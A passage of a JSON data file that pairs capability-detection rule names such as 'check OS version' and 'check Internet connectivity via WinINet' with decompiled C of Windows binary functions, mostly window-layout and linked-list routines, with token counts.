            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00469404(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(arg_8h + -4) == *(in_EAX + 4)) {\n        *(arg_8h + -8) = in_EAX;\n        return;\n    }\n    if ((*(arg_8h + -8) == 0) && (*(in_EAX + 0xc) != 0)) {\n        fcn.00469404(arg_8h);\n    }\n    if ((*(arg_8h + -8) == 0) && (*(in_EAX + 8) != 0)) {\n        fcn.00469404(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "0046945c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0046945c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((param_2 != 0) && (*(in_EAX + 100) != 0)) {\n        fcn.00469404(&stack0xfffffffc);\n    }\n    return 0;\n}\n",
        "token_count": 92
    },
    "00469560": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00469560(uint arg_8h)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint8_t in_CL;\n    uint8_t uVar4;\n    int32_t in_EDX;\n    int32_t var_30h;\n    int32_t iStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint8_t var_9h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (*(in_EDX + 0x57) != '\\0') {\n        var_1h._0_1_ = in_CL;\n        if (in_EAX[0xe] == 0) {\n            if (*(in_EAX[0x19] + 8) == 0) {\n                (**(*in_EAX[5] + 0x44))();\n                (**(*in_EAX[5] + 0x90))();\n                var_10h = var_14h - var_1ch;\n                if (*(in_EAX[5] + 0x5c) != '\\0') {\n                    if (var_18h == var_20h) {\n                        fcn.0045eee4();\n                    }\n                    if (var_10h == 0) {\n                        var_10h = fcn.0045eed0();\n                    }\n                }\n                fcn.004181e8(&var_30h, var_10h);\n                var_20h = var_30h;\n                var_1ch = iStack48;\n                var_18h = iStack44;\n                var_14h = iStack40;\n                (***in_EAX)();\n                fcn.0045e884();\n                iVar1 = fcn.00468b8c();\n                iVar2 = in_EAX[0x19];\n                *(iVar2 + 8) = iVar1;\n                *(iVar1 + 0x14) = iVar2;\n                *(iVar1 + 4) = in_EDX;\n            }\n            else {\n                if ((in_CL == 0) || (in_CL == 5)) {\n                    var_1h._0_1_ = 4;\n                }\n                iVar2 = fcn.0046945c();\n                if (iVar2 != 0) {\n                    fcn.0046a6b0();\n                }\n                var_8h = fcn.0046945c();\n                var_9h = *(var_1h + 0x4a48a0);\n                iVar2 = fcn.00468bb0();\n                if (iVar2 == 1) {\n                    *(in_EAX[0x19] + 0x10) = var_9h;\n                    if (var_9h == 1) {\n                        fcn.00468d34();\n                        fcn.00469130();\n                        uVar3 = fcn.00468d34();\n                        in_EAX[0x1a] = uVar3;\n                    }\n                    else if (var_9h == 2) {\n                        fcn.00468d34();\n                        fcn.00469130();\n                        uVar3 = fcn.00468d34();\n                        in_EAX[0x1a] = uVar3;\n                    }\n                }\n                iVar2 = fcn.00468b8c();\n                *(iVar2 + 4) = in_EDX;\n                if (var_8h == 0) {\n                    uVar4 = *(in_EAX[0x19] + 0x10);\n                }\n                else {\n                    uVar4 = *(*(var_8h + 0x14) + 0x10);\n                }\n                if (var_9h == 0) {\n                    var_9h = uVar4;\n                }\n                if (uVar4 == var_9h) {\n                    fcn.00469924(*(var_1h + 0x4a48a8));\n                }\n                else {\n                    fcn.0046977c(*(var_1h + 0x4a48a8), var_9h);\n                }\n            }\n        }\n        else {\n            *(in_EAX[0xe] + 4) = in_EDX;\n            fcn.00468f8c();\n        }\n        (**(*in_EAX[5] + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 1042
    },
    "0046977c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046977c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    iVar2 = fcn.00468b8c();\n    *(iVar2 + 0x10) = arg_ch;\n    if (in_ECX == 0) {\n        fcn.00469130();\n        uVar3 = fcn.00469108();\n        *(in_EAX + 0x68) = uVar3;\n        *(in_EAX + 0x48) = arg_ch;\n        *(in_EAX + 0x40) = 0;\n        *(in_EAX + 0x44) = 0x3fe00000;\n        if (arg_8h == '\\0') {\n            *(iVar2 + 8) = in_EDX;\n            iVar1 = *(in_EAX + 100);\n            *(iVar1 + 0x14) = iVar2;\n            *(iVar1 + 0x18) = in_EDX;\n            *(in_EDX + 0xc) = iVar1;\n            *(in_EDX + 0x14) = iVar2;\n            *(in_EAX + 100) = iVar2;\n            fcn.004694c4(0x46aa38);\n            uVar4 = fcn.00469108();\n            iVar2 = uVar4 >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((uVar4 & 1) != 0);\n            }\n            *(in_EAX + 0x4c) = iVar2;\n            fcn.004694c4(0x46ae88);\n            fcn.00469108();\n            fcn.00469130();\n        }\n        else {\n            *(iVar2 + 8) = *(in_EAX + 100);\n            iVar1 = *(in_EAX + 100);\n            *(iVar1 + 0x14) = iVar2;\n            *(iVar1 + 0xc) = in_EDX;\n            *(in_EDX + 0x18) = iVar1;\n            *(in_EDX + 0x14) = iVar2;\n            *(in_EAX + 100) = iVar2;\n            fcn.004694c4(0x46aa38);\n        }\n        fcn.004694c4(0x46afc0);\n    }\n    else {\n        fcn.00469108();\n        fcn.00469130();\n        *(iVar2 + 0x14) = *(in_ECX + 0x14);\n        iVar1 = *(in_ECX + 0x18);\n        *(iVar2 + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0xc) = iVar2;\n        }\n        iVar1 = *(in_ECX + 0xc);\n        *(iVar2 + 0xc) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0x18) = iVar2;\n        }\n        if (in_ECX == *(*(iVar2 + 0x14) + 8)) {\n            *(*(iVar2 + 0x14) + 8) = iVar2;\n        }\n        *(in_EDX + 0x14) = iVar2;\n        *(in_ECX + 0x14) = iVar2;\n        if (arg_8h == '\\0') {\n            *(iVar2 + 8) = in_EDX;\n            *(in_ECX + 0x18) = in_EDX;\n            *(in_ECX + 0xc) = 0;\n            *(in_EDX + 0xc) = in_ECX;\n        }\n        else {\n            *(iVar2 + 8) = in_ECX;\n            *(in_ECX + 0x18) = 0;\n            *(in_ECX + 0xc) = in_EDX;\n            *(in_EDX + 0x18) = in_ECX;\n        }\n    }\n    fcn.00468dec();\n    fcn.00469184();\n    fcn.004694c4(0x46afc0);\n    return;\n}\n",
        "token_count": 960
    },
    "0046999c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.0046999c(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    var_5h = 0;\n    iVar1 = fcn.00468cb0();\n    iVar2 = fcn.00468cb0();\n    if (*(in_EAX + 0x1c) == '\\0') {\n        if (((iVar2 <= *in_ECX) && (*in_ECX <= *(in_EAX + 0x18) + iVar2)) && (iVar1 <= in_ECX[1])) {\n            iVar2 = fcn.00468d34();\n            if (in_ECX[1] <= iVar1 + iVar2) {\n                var_5h = 1;\n                if (in_ECX[1] < *(*(in_EDX + 4) + 0x44) + 0xf) {\n                    *arg_8h = 0x14;\n                }\n                else {\n                    *arg_8h = 2;\n                }\n            }\n        }\n    }\n    else if (((iVar1 <= in_ECX[1]) && (in_ECX[1] <= iVar1 + *(in_EAX + 0x18))) && (iVar2 <= *in_ECX)) {\n        iVar1 = fcn.00468d34();\n        if (*in_ECX <= iVar1 + iVar2) {\n            var_5h = 1;\n            if (*(*(in_EDX + 4) + 0x40) + *(*(in_EDX + 4) + 0x48) + -0xf < *in_ECX) {\n                *arg_8h = 0x14;\n            }\n            else {\n                *arg_8h = 2;\n            }\n        }\n    }\n    return var_5h;\n}\n",
        "token_count": 442
    },
    "00469aa0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.00469aa0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uchar *puStack40;\n    uint uStack36;\n    uchar auStack20 [4];\n    \n    iVar2 = fcn.00462d98();\n    iVar2 = iVar2 + -1;\n    if (-1 < iVar2) {\n        do {\n            piVar3 = fcn.00462d5c();\n            if ((*(piVar3 + 0x57) != '\\0') && ((cVar1 = fcn.004047cc(),  cVar1 == '\\0' || (*(piVar3 + 0x1da) != '\\0'))))\n            {\n                fcn.00418198();\n                (**(*piVar3 + 0x44))(puStack40, uStack36);\n                puStack40 = auStack20;\n                iVar4 = sub.user32.dll_PtInRect();\n                if (iVar4 != 0) {\n                    return piVar3;\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return NULL;\n}\n",
        "token_count": 268
    },
    "00469b2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00469b2c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (*(*(in_EAX + 0x14) + 0x10) == '\\x01') {\n        iVar2 = fcn.00469108();\n        if (*(*(arg_8h + -4) + 4) <= iVar2) {\n            iVar2 = fcn.00469108();\n            if (iVar2 - *(*(arg_8h + -8) + 0xc) <= *(*(arg_8h + -4) + 4)) {\n                **(arg_8h + -0xc) = 0x12;\n                *(arg_8h + -0x10) = in_EAX;\n                goto code_r0x00469bef;\n            }\n        }\n    }\n    if (*(*(in_EAX + 0x14) + 0x10) == '\\x02') {\n        iVar2 = fcn.00469108();\n        if (**(arg_8h + -4) <= iVar2) {\n            iVar2 = fcn.00469108();\n            if (iVar2 - *(*(arg_8h + -8) + 0xc) <= **(arg_8h + -4)) {\n                **(arg_8h + -0xc) = 0x12;\n                *(arg_8h + -0x10) = in_EAX;\n                goto code_r0x00469bef;\n            }\n        }\n    }\n    if (*(in_EAX + 4) != 0) {\n        cVar1 = (**(**(arg_8h + -8) + 0x40))(*(arg_8h + -0xc));\n        if (cVar1 != '\\0') {\n            *(arg_8h + -0x10) = in_EAX;\n        }\n    }\ncode_r0x00469bef:\n    if (*(arg_8h + -0x10) == 0) {\n        iVar2 = fcn.004691e4();\n        if (iVar2 != 0) {\n            iVar2 = arg_8h;\n            fcn.004691e4();\n            fcn.00469b2c(iVar2);\n        }\n    }\n    if (*(arg_8h + -0x10) == 0) {\n        iVar2 = fcn.0046920c();\n        if (iVar2 != 0) {\n            fcn.0046920c();\n            fcn.00469b2c(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 580
    },
    "00469c40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00469c40(uint *param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *arg_8h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    var_10h = 0;\n    *param_1 = 0;\n    iVar1 = fcn.00469aa0();\n    if ((iVar1 == 0) || (*(in_EAX + 0x14) != *(iVar1 + 0x94))) {\n        iVar2 = fcn.0046920c();\n        if ((iVar2 != 0) && (iVar1 == 0)) {\n            fcn.0046920c();\n            fcn.00469b2c(arg_8h);\n        }\n    }\n    else {\n        var_10h = fcn.0046945c();\n        if (var_10h != 0) {\n            *param_1 = 1;\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 259
    },
    "00469cc8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00469cc8(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    fcn.0040546c();\n    (**(**(arg_8h + -4) + 0xc))();\n    if (0 < in_ECX) {\n        fcn.00405b8c();\n        (**(**(arg_8h + -4) + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00469d10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00469d10(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint *arg_ch;\n    uint uVar6;\n    uint uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uchar var_26h;\n    int32_t var_25h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack88 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack92 = 0x46a053;\n    uStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack96;\n    var_ch = in_EAX;\n    var_4h = param_2;\n    fcn.0046a614();\n    var_25h._0_1_ = *(var_ch + 0x1d);\n    fcn.004693ec();\n    uVar6 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    (**(*var_4h + 0xc))();\n    if (var_1ch == 0x40000) {\n        *(var_ch + 0x1d) = 0;\n        var_26h = 0;\n    }\n    else if (var_ch[0x1c] == var_1ch) {\n        (**(*var_4h + 0xc))();\n        (**(*var_4h + 0xc))();\n    }\n    else {\n        var_40h = var_ch[0x1c];\n        var_3ch._0_1_ = 0;\n        var_38h = var_1ch;\n        var_34h._0_1_ = 0;\n        arg_ch = &var_40h;\n        uVar4 = 1;\n        fcn.00407480();\n        fcn.0040da34(uVar4, arg_ch);\n        fcn.00404eb4();\n    }\n    (**(*var_4h + 0xc))();\n    if (-1 < var_20h + -1) {\n        var_30h = var_20h;\n        var_1ch = 0;\n        do {\n            fcn.00469cc8(&stack0xfffffffc);\n            if (var_8h != 0) {\n                fcn.0040483c();\n                if (var_10h != 0) {\n                    fcn.0045ee64();\n                    uVar6 = 0;\n                    fcn.0045fd44(0);\n                }\n            }\n            var_1ch = var_1ch + 1;\n            var_30h = var_30h + -1;\n        } while (var_30h != 0);\n    }\n    (**(*var_4h + 0xc))();\n    if (*(var_ch + 0x1d) != '\\0') {\n        (**(*var_ch + 0x28))();\n        iVar2 = fcn.0046b704();\n        var_ch[0x1a] = iVar2;\n    }\n    var_18h = 0;\n    iVar2 = 0;\ncode_r0x00469eae:\n    do {\n        (**(*var_4h + 0xc))();\n        if (var_14h == *0x4a48b0) {\n            *in_FS_OFFSET = uVar6;\n            *(var_ch + 0x1d) = var_25h;\n            if (var_ch[0x19] == 0) {\n                iVar2 = fcn.00468b8c();\n                var_ch[0x19] = iVar2;\n            }\n            fcn.004693f0();\n            return;\n        }\n        iVar3 = fcn.00468b8c();\n        (**(*var_4h + 0xc))();\n        (**(*var_4h + 0xc))();\n        if (*(var_ch + 0x1d) != '\\0') {\n            (**(*var_ch + 0x28))();\n            uVar4 = fcn.0046b704();\n            *(iVar3 + 0x20) = uVar4;\n        }\n        fcn.00469cc8(&stack0xfffffffc);\n        if (var_8h != 0) {\n            cVar1 = fcn.00468ed8();\n            if (cVar1 == '\\0') {\n                fcn.00404640();\n                goto code_r0x00469eae;\n            }\n        }\n        if (var_14h == 0) {\n            var_ch[0x19] = iVar3;\n        }\n        else if (var_14h == var_18h) {\n            iVar5 = iVar2;\n            if ((*(iVar2 + 0x18) != 0) && (*(iVar2 + 4) == 0)) {\n                iVar5 = *(iVar2 + 0x18);\n                var_2ch = iVar2;\n                fcn.00404640();\n            }\n            *(iVar5 + 0xc) = iVar3;\n            *(iVar3 + 0x18) = iVar5;\n            *(iVar3 + 0x14) = *(iVar5 + 0x14);\n        }\n        else if (var_18h < var_14h) {\n            *(iVar2 + 8) = iVar3;\n            *(iVar3 + 0x14) = iVar2;\n        }\n        else if (var_14h < var_18h) {\n            unique0x10000202 = iVar2;\n            if (0 < var_18h - var_14h) {\n                var_1ch = 1;\n                var_30h = var_18h - var_14h;\n                do {\n                    unique0x00007a00 = *(stack0xffffffd8 + 0x14);\n                    var_1ch = var_1ch + 1;\n                    var_30h = var_30h + -1;\n                } while (var_30h != 0);\n            }\n            *(stack0xffffffd8 + 0xc) = iVar3;\n            *(iVar3 + 0x18) = stack0xffffffd8;\n            *(iVar3 + 0x14) = *(stack0xffffffd8 + 0x14);\n        }\n        var_18h = var_14h;\n        iVar2 = iVar3;\n    } while( true );\n}\n",
        "token_count": 1571
    },
    "0046a330": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046a330(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack48 = 0x46a349;\n    var_4h = fcn.00428554();\n    uStack52 = 0x46a454;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x46a365;\n    puStack48 = &stack0xfffffffc;\n    fcn.0045d7f0();\n    puStack60 = 0x46a36d;\n    fcn.0042881c();\n    uStack64 = 0x46a437;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x46a385;\n    puStack60 = &stack0xfffffffc;\n    fcn.00428be8();\n    uStack76 = 0x46a41a;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    iVar1 = fcn.00462d98();\n    if (-1 < iVar1 + -1) {\n        var_8h = 0;\n        var_ch = iVar1;\n        do {\n            iVar1 = fcn.00462d5c();\n            if ((*(iVar1 + 0x57) != '\\0') && (*(iVar1 + 0x94) == in_EAX[5])) {\n                fcn.0045e864();\n                (***in_EAX)();\n                (**(*in_EAX + 4))();\n                (**(*in_EAX + 0x20))(&fcn.0046a330::var_1ch);\n            }\n            var_8h = var_8h + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    *in_FS_OFFSET = uStack80;\n    puStack72 = 0x46a421;\n    uStack76 = 0x46a419;\n    fcn.00428be8();\n    return;\n}\n",
        "token_count": 579
    },
    "0046a464": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046a464(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint *arg_8h_00;\n    int32_t var_1ch;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar2 = fcn.004656f0();\n    if (((in_ECX == 0) || (*(in_ECX + 0x90) == '\\0')) || (iVar2 < 2)) {\n        uVar3 = fcn.0045e904();\n        arg_8h_00 = &var_1ch;\n        fcn.0045e8c0();\n        fcn.004181c0(arg_8h_00, uVar3);\n        *arg_8h = var_1ch;\n        arg_8h[1] = iStack28;\n        arg_8h[2] = iStack24;\n        arg_8h[3] = iStack20;\n        if (0 < iVar2) {\n            if (arg_ch == '\\x01') {\n                arg_8h[3] = arg_8h[3] / 2;\n            }\n            else if (arg_ch == '\\x02') {\n                iVar2 = arg_8h[3] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[3] & 1U) != 0);\n                }\n                arg_8h[1] = iVar2;\n            }\n            else if (arg_ch == '\\x03') {\n                arg_8h[2] = arg_8h[2] / 2;\n            }\n            else if (arg_ch == '\\x04') {\n                iVar2 = arg_8h[2] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[2] & 1U) != 0);\n                }\n                *arg_8h = iVar2;\n            }\n        }\n    }\n    else {\n        var_4h = *(in_ECX + 0x40);\n        var_8h = *(in_ECX + 0x44);\n        uVar4 = *(in_ECX + 0x48);\n        var_ch = *(in_ECX + 0x4c);\n        if (arg_ch - 3U < 2) {\n            uVar1 = uVar4 & 1;\n            uVar4 = uVar4 >> 1;\n            if (uVar4 < 0) {\n                uVar4 = uVar4 + (uVar1 != 0);\n            }\n        }\n        else if (arg_ch - 1U < 2) {\n            var_ch = *(in_ECX + 0x4c) >> 1;\n            if (var_ch < 0) {\n                var_ch = var_ch + ((*(in_ECX + 0x4c) & 1) != 0);\n            }\n        }\n        if (arg_ch == '\\x02') {\n            var_8h = var_8h + var_ch;\n        }\n        else if (arg_ch == '\\x04') {\n            var_4h = var_4h + uVar4;\n        }\n        fcn.004181e8(&var_1ch, var_ch);\n        *arg_8h = var_1ch;\n        arg_8h[1] = iStack28;\n        arg_8h[2] = iStack24;\n        arg_8h[3] = iStack20;\n    }\n    uVar3 = fcn.00466ca8(0, arg_8h, 2);\n    sub.user32.dll_MapWindowPoints(uVar3);\n    return;\n}\n",
        "token_count": 892
    },
    "0046a6b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046a6b0(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStackY52;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack40 = 0x46a941;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar2 = &stack0xfffffffc;\n    if (param_2 == 0) {\n        fcn.00407480();\n        uStackY52 = 0x46a6f0;\n        fcn.00407480(&fcn.0046a6b0::var_4h);\n        fcn.00405738();\n        fcn.0040d9f8();\n        fcn.00404eb4();\n        puVar2 = puStack36;\n    }\n    puStack36 = puVar2;\n    if (*(param_2 + 4) == 0) {\n        fcn.00407480();\n        uStackY52 = 0x46a731;\n        fcn.00407480(&fcn.0046a6b0::var_ch);\n        fcn.00405738();\n        fcn.0040d9f8();\n        fcn.00404eb4();\n    }\n    iVar3 = fcn.00468bb0();\n    if (iVar3 == 1) {\n        iVar3 = *(in_EAX + 100);\n        *(iVar3 + 8) = 0;\n        *(iVar3 + 0x10) = 0;\n    }\n    else if (iVar3 == 2) {\n        iVar3 = *(param_2 + 0x18);\n        if (iVar3 == 0) {\n            iVar3 = *(param_2 + 0xc);\n        }\n        if (*(iVar3 + 4) == 0) {\n            if (*(param_2 + 0x14) == *(in_EAX + 100)) {\n                fcn.00469144();\n                uVar4 = fcn.00469108();\n                *(in_EAX + 0x68) = uVar4;\n                fcn.00404640();\n                *(in_EAX + 100) = iVar3;\n                *(iVar3 + 0xc) = 0;\n                *(iVar3 + 0x18) = 0;\n                *(iVar3 + 0x14) = 0;\n                fcn.0046af98();\n            }\n            else {\n                iVar1 = *(iVar3 + 8);\n                if (iVar1 == 0) {\n                    *(*(iVar3 + 0x14) + 8) = 0;\n                    fcn.00404640();\n                }\n                else {\n                    *(iVar1 + 0x18) = *(*(param_2 + 0x14) + 0x18);\n                    if (*(*(iVar3 + 8) + 0x18) == 0) {\n                        *(*(*(param_2 + 0x14) + 0x14) + 8) = iVar1;\n                    }\n                    else {\n                        *(*(*(iVar3 + 8) + 0x18) + 0xc) = iVar1;\n                    }\n                    iVar3 = *(iVar3 + 8);\n                    *(iVar3 + 0x14) = *(*(param_2 + 0x14) + 0x14);\n                    iVar1 = *(iVar3 + 0xc);\n                    while (iVar1 != 0) {\n                        iVar3 = *(iVar3 + 0xc);\n                        *(iVar3 + 0x14) = *(*(param_2 + 0x14) + 0x14);\n                        iVar1 = *(iVar3 + 0xc);\n                    }\n                    *(iVar3 + 0xc) = *(*(param_2 + 0x14) + 0xc);\n                    if (*(iVar3 + 0xc) != 0) {\n                        *(*(iVar3 + 0xc) + 0x18) = iVar3;\n                    }\n                    uStackY52 = 0x46afc0;\n                    fcn.004694c4();\n                    fcn.00404640();\n                    fcn.00404640();\n                }\n            }\n        }\n        else {\n            iVar1 = *(param_2 + 0x14);\n            if (*(in_EAX + 100) == iVar1) {\n                *(*(in_EAX + 100) + 8) = iVar3;\n                *(iVar3 + 0x18) = 0;\n                *(iVar3 + 0xc) = 0;\n                fcn.00468c68();\n                fcn.00469130();\n                fcn.00468f8c();\n            }\n            else {\n                *(iVar1 + 0x10) = 0;\n                *(iVar1 + 4) = *(iVar3 + 4);\n                *(iVar1 + 8) = 0;\n                fcn.00404640();\n            }\n            uStackY52 = 0x46afc0;\n            fcn.004694c4();\n        }\n    }\n    else {\n        iVar3 = *(param_2 + 0x18);\n        if (iVar3 == 0) {\n            *(*(param_2 + 0x14) + 8) = *(param_2 + 0xc);\n            *(*(param_2 + 0xc) + 0x18) = 0;\n            fcn.00468f8c();\n        }\n        else {\n            *(iVar3 + 0xc) = *(param_2 + 0xc);\n            if (*(param_2 + 0xc) != 0) {\n                *(*(param_2 + 0xc) + 0x18) = iVar3;\n            }\n            fcn.00469108();\n            fcn.00469144();\n            fcn.00468f8c();\n        }\n        uStackY52 = 0x46afc0;\n        fcn.004694c4();\n    }\n    fcn.00404640();\n    *in_FS_OFFSET = uStackY52;\n    uStack44 = 0x46a948;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1463
    },
    "0046aaf4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
